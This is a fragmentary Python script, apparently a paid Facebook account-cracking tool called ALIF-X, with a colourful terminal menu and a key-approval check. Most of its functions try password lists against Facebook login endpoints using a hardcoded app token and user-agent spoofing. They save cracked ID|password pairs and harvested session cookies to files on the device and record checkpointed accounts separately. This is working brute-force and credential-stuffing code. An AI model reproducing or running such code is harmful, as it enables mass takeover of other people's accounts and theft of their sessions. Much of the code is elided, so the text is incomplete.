...
def fuckxx2():
        ...
        return ua
#-----------------------------------------------------#
sys.stdout.write('\x1b]2;Alif-X\x07')
#-----------------------------------------------------#
#-------------------------------#
logo = ("""   \33[1;32m
 #     #       ####### ####### ####### #       
 ...
 #     #          #    ####### ####### ####### 
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFACEBOOK  \033[1;31m● \x1b[38;5;46mALFI CHOWDHURY
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVERSION  \033[1;31m ● \x1b[38;5;46m1.0
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mGITHUB   \033[1;31m ● \x1b[38;5;46mALIF-X
...
os.system('clear')
print(logo)
os.system('xdg-open https://t.me/toolsowner')
while attemps < 999999999998888888888889999999999999999999999999999:
    username = input(f'\33[1;91m[\33[1;97m✓\33[1;91m]\033[1;92m ENTER THIS DEVICE KEY (PAID-X) \33[1;97m:\33[1;92m ')
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m{XX}[\x1b[1;92m={XX}]\x1b[38;5;46m FILE NAME : /sdcard/ALIF.txt  etc..')
				linexx()
				...
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/ALIF.ALIF.528');menu()
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\033[1;91m[{G}ALIF-M1\033[1;91m]\033[1;97m-\033[1;91m[{G}%s\033[1;91m]\033[1;97m-\033[1;91m[{G}OK:%s\033[1;91m]'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ALIF-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALIF-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;91m [ALIF-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALIF-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\033[1;91m[{G}ALIF-M2\033[1;91m]\033[1;97m-\033[1;91m[{G}%s\033[1;91m]\033[1;97m-\033[1;91m[{G}OK:%s\033[1;91m]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Type': 'application/x-www-form-urlencoded'}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\033[1;31m [\033[1;32mALIF-OK\033[1;31m]\033[1;32m '+ids+' \033[1;31m● \033[1;32m'+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                       # print(f' {G}<[{A}🍪{G}]> {A}'+cookies)
                                        #linexx()
                                        open('/sdcard/ALIF-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/ALIF-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                       # if 'y' in pcp:
                                               # print(f'\r\r\x1b[1;31m [RIMON-CP] '+ids+' ● '+pas+'\033[1;97m')
                                                open('/sdcard/ALIF-LOCK.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
...
def ffb(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m[ALIF-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ALIF-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RAHAT-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m[ALIF-CP] '+ids+' | '+pas+'\033[1;32m')
                                        open('/sdcard/ALIF-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def rimon(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\033[1;91m[{G}ALIF-M4\033[1;91m]\033[1;97m-\033[1;91m[{G}%s\033[1;91m]\033[1;97m-\033[1;91m[{G}OK:%s\033[1;91m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[ALIF-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ALIF-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RAHAT-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;91m[\033[1;92mALIF-M1\033[1;91m]\033[1;97m-\033[1;91m[{cl}{loop}\033[1;91m]\033[1;91m-\033[1;91m[\033[1;92mOK:{len(oks)}\033[1;91m]');sys.stdout.flush() 
    sys.stdout.flush()
    try:
        for pas in pwv:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                    print(f'\r\r{A}[{G1}ALIF-OK{A}]{G1} {uid} {A}|{G1} {pas}')
                    print(f'\r{G}[{A}COOKIE{G}] {A} '+coki)
                    #linexx()
                    open('/sdcard/ALIF-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    ok.append(uid)
                    break
                if res == 'LOCK':
                    print(f'\r\033[1;31m[ALIF-CP] {uid} {A}|\033[1;31m {pas}')
                    open('/sdcard/ALIF-RANDOM-M1-CP.txt','a').write(uid+'|'+pas+'\n')
                    cp.append(uid)
                    break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    ...
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;91m[\033[1;92mALIF-M2\033[1;91m]\033[1;97m-\033[1;91m[{cl}{loop}\033[1;91m]\033[1;91m-\033[1;91m[\033[1;92mOK:{len(oks)}\033[1;91m]');sys.stdout.flush() 
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r \033[1;31m[{G}ALIF-OK💚\033[1;31m]{G1} '+ids+' \033[1;31m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {G}[{A}COOKIE{G}]==>>{A} '+kuki+'')
                linexx()
                open('/sdcard/ALIF-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def MM3X(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;91m[\033[1;92mALIF-M3\033[1;91m]\033[1;97m-\033[1;91m[{cl}{loop}\033[1;91m]\033[1;91m-\033[1;91m[\033[1;92mOK:{len(oks)}\033[1;91m]');sys.stdout.flush() 
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {G}[{A}COOKIE{G}]==>>{A} '+kuki+'')
                linexx()
                open('/sdcard/ALIF-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M444(ids,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mALIF-M4\033[1;91m]\033[1;97m-\033[1;91m[{cl}{loop}\033[1;91m]\033[1;91m-\033[1;91m[\033[1;92mOK:{len(oks)}\033[1;91m]');sys.stdout.flush() 
            ua = random.choice(ugen)      
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\r [{G}ALIF-OK]{G} '+uid+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {R}[{G}COOKIE{R}]{G} : '+coki)
                open('/sdcard/ALIF-RANDOM-M4-OK.txt', 'a').write(uid+' | '+ps+' | '+coki+'\n')
                oks.append(cid)                
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\033[1;30m[ALIF-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/ALIF-CP-RND.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def approval():
  ...
  MY_KEY = id+xp
  try:
    httpCaht = requests.get('https://github.com/alfi-xd/ALFI-X/blob/main/Paid.txt').text 
    if id in httpCaht:
      ...
      tks = ('Dear%20HAMZA%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+MY_KEY);os.system('am start https://t.me/toolsowner?text='+tks) 
      time.sleep(1)
      approval()
  except:
    sys.exit()
